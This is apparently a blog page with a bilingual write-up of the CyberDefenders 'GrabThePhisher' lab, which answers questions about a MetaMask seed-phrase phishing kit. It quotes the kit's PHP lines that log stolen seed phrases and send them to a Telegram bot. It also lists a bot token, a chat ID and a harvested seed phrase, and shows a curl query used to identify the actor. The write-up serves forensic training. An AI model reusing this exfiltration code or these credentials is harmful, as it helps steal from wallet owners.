@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=4444&amp;path=livereload" data-no-instant defer></script>
+
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+	<title>GrabThePhisher - Cyberdefenders (Easy) |  fafi </title>
+    
+
+	<link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="android-chrome-192x192" type="image/png" sizes="192x192" href="/images/android-chrome-192x192.png">
+    <link rel="android-chrome-512x512" type="image/png" sizes="512x512" href="/images/android-chrome-512x512.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+	<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+
+</head>
+
+<body>
+
+<header class="site-header">
+
+<nav>
+  <div>
+    <a href="/" class="title">
+          
+            fafi 
+          
+    </a>
+  </div>
+  
+  
+  <div class="sections">
+            
+            
+            
+            
+            <a  href="/" title="">Home</a>
+            
+            
+            <a  href="/writeups/" title="">Writeups</a>
+            
+            
+            <a  href="/labs/" title="">Labs</a>
+            
+            
+            <a  href="/posts/" title="">Posts</a>
+            
+  </div>
+
+</nav>
+
+</header>
+
+
+
+
+
+<div class="single-content">
+    
+    <h3 class="single-content-title">GrabThePhisher - Cyberdefenders (Easy)</h3>
+
+    <p><a href="https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/">link del laboratorio GrabThePhisher</a></p>
+<h2 id="descargar-laboratorio-y-moverlo-a-la-máquina-virtual-remnux">Descargar laboratorio y moverlo a la máquina virtual REMnux</h2>
+<h3 id="unzip-lab">unzip lab</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z x 95-GrabThePhisher.zip -pcyberdefenders.org
+</span></span></code></pre></div><h2 id="preguntas">Preguntas</h2>
+<h3 id="q1">Q1</h3>
+<p>Which wallet is used for asking the seed phrase?</p>
+<p>¿Qué monedero se utiliza para pedir la frase semilla?</p>
+<p><img src="/images/labs/cyberdefenders/grabthephisher/phishinglab1.png" alt="first question phishinglab"></p>
+<h4 id="respuesta">Respuesta</h4>
+<p><code>Metamask</code></p>
+<h3 id="q2">Q2</h3>
+<p>What is the file name that has the code for the phishing kit?</p>
+<p>¿Cuál es el nombre del archivo que contiene el código del kit de phishing?</p>
+<h4 id="respuesta-1">Respuesta</h4>
+<p><code>metamask.php</code></p>
+<h3 id="q3">Q3</h3>
+<p>In which language was the kit written?</p>
+<p>¿En qué lenguaje fue desarrollado el kit?</p>
+<h4 id="respuesta-2">Respuesta</h4>
+<p><code>php</code></p>
+<h3 id="q4">Q4</h3>
+<p>What service does the kit use to retrieve the victim&rsquo;s machine information?</p>
+<p>¿Qué servicio utiliza el kit para recuperar la información de la máquina de la víctima?</p>
+<p><img src="/images/labs/cyberdefenders/grabthephisher/phishinglab2.png" alt="fourth question phishinglab"></p>
+<h4 id="respuesta-3">Respuesta</h4>
+<p><code>sypex geo</code></p>
+<h3 id="q5">Q5</h3>
+<p>How many seed phrases were already collected?</p>
+<p>¿Cuántas frases con semilla se han recopilado ya?</p>
+<p><em>En el código se puede ver que las frases semilla se escriben en un archivo log.txt</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">@</span>file_put_contents(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;DOCUMENT_ROOT&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;/log/&#39;</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;log.txt&#39;</span>, <span style="color:#8be9fd;font-style:italic">$text</span>, FILE_APPEND); 
+</span></span></code></pre></div><p><img src="/images/labs/cyberdefenders/grabthephisher/phishinglab3.png" alt="fifth question phishinglab"></p>
+<h4 id="respuesta-4">Respuesta</h4>
+<p><code>3</code></p>
+<h3 id="q6">Q6</h3>
+<p>Write down the seed phrase of the most recent phishing incident</p>
+<p>Escriba la frase semilla del incidente de phishing más reciente</p>
+<h4 id="respuesta-5">Respuesta</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>father also recycle embody balance concert mechanic believe owner pair muffin hockey 
+</span></span></code></pre></div><h3 id="q7">Q7</h3>
+<p>Which medium had been used for credential dumping?</p>
+<p>¿Qué medio se había utilizado para el robo de credenciales?</p>
+<p><em>Línea de código presente en el archivo metamask.php</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$filename</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://api.telegram.org/bot&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$token</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;/sendMessage?chat_id=&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;&amp;text=&#34;</span><span style="color:#ff79c6">.</span>urlencode(<span style="color:#8be9fd;font-style:italic">$message</span>)<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;&amp;parse_mode=html&#34;</span>; 
+</span></span></code></pre></div><h4 id="respuesta-6">Respuesta</h4>
+<p><code>telegram</code></p>
+<h3 id="q8">Q8</h3>
+<p>What is the token for the channel?</p>
+<p>¿Cuál es el token del canal?</p>
+<p><em>Línea de código presente en el archivo metamask.php</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$token</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10&#34;</span>; 
+</span></span></code></pre></div><h4 id="respuesta-7">Respuesta</h4>
+<p><code>5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10</code></p>
+<h3 id="q9">Q9</h3>
+<p>What is the chat ID of the phisher&rsquo;s channel?</p>
+<p>¿Cuál es el ID de chat del canal del autor del phishing?</p>
+<p><em>Línea de código presente en el archivo metamask.php</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$id</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;5442785564&#34;</span>; 
+</span></span></code></pre></div><h4 id="respuesta-8">Respuesta</h4>
+<p><code>5442785564</code></p>
+<h3 id="q10">Q10</h3>
+<p>What are the allies of the phish kit developer?</p>
+<p>¿Cuáles son los aliados del desarrollador del kit de phishing?</p>
+<p><em>Comentario encontrado en el código fuente del archivo metamask.php</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#6272a4">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> With love and respect to all the hustler out there,
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> This is a small gift to my brothers,
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> All the best with your luck,
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> Regards, 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> j1j1b1s@m3r0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">  
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">*/</span>  
+</span></span></code></pre></div><h4 id="respuesta-9">Respuesta</h4>
+<p><code>j1j1b1s@m3r0</code></p>
+<h3 id="q11">Q11</h3>
+<p>What is the full name of the Phish Actor?</p>
+<p>¿Cuál es el nombre completo del creador del phishing?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat<span style="color:#f1fa8c">\?</span>chat_id<span style="color:#f1fa8c">\=</span><span style="color:#bd93f9">5442785564</span> | jq 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ok&#34;</span>: true,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;result&#34;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;id&#34;</span>: 5442785564,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;first_name&#34;</span>: <span style="color:#f1fa8c">&#34;Marcus&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;last_name&#34;</span>: <span style="color:#f1fa8c">&#34;Aurelius&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;pumpkinboii&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;type&#34;</span>: <span style="color:#f1fa8c">&#34;private&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;active_usernames&#34;</span>: <span style="color:#ff79c6">[</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;pumpkinboii&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;max_reaction_count&#34;</span>: 11,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;accent_color_id&#34;</span>: <span style="color:#bd93f9">6</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>  
+</span></span></code></pre></div><h4 id="respuesta-10">Respuesta</h4>
+<p><code>Marcus Aurelius</code></p>
+<h3 id="q12">Q12</h3>
+<p>What is the username of the Phish Actor?</p>
+<p>¿Cuál es el nombre de usuario del creador del phishing?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;active_usernames&#34;</span>: <span style="color:#ff79c6">[</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;pumpkinboii&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">]</span>,
+</span></span></code></pre></div><h4 id="respuesta-11">Respuesta</h4>
+<p><code>pumpkinboii</code></p>
+
+</div>
+
+
+<footer>
+<a class="footer-github" href='https://github.com/jfbfafi' target='_blank' rel='noreferrer'>
+	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24"><path fill="#50fa7b" d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5c.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34c-.46-1.16-1.11-1.47-1.11-1.47c-.91-.62.07-.6.07-.6c1 .07 1.53 1.03 1.53 1.03c.87 1.52 2.34 1.07 2.91.83c.09-.65.35-1.09.63-1.34c-2.22-.25-4.55-1.11-4.55-4.92c0-1.11.38-2 1.03-2.71c-.1-.25-.45-1.29.1-2.64c0 0 .84-.27 2.75 1.02c.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02c.55 1.35.2 2.39.1 2.64c.65.71 1.03 1.6 1.03 2.71c0 3.82-2.34 4.66-4.57 4.91c.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/>
+	</svg>
+</a>
+
+<a class="footer-linkedin" href='https://www.linkedin.com/in/juan-fafi-burgos/' target='_blank' rel='noreferrer'>
+
+	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24">
+		<path fill="#50fa7b" d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.32 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93zM6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37z" />
+	</svg>
+</a>
+
+
+</footer>
+
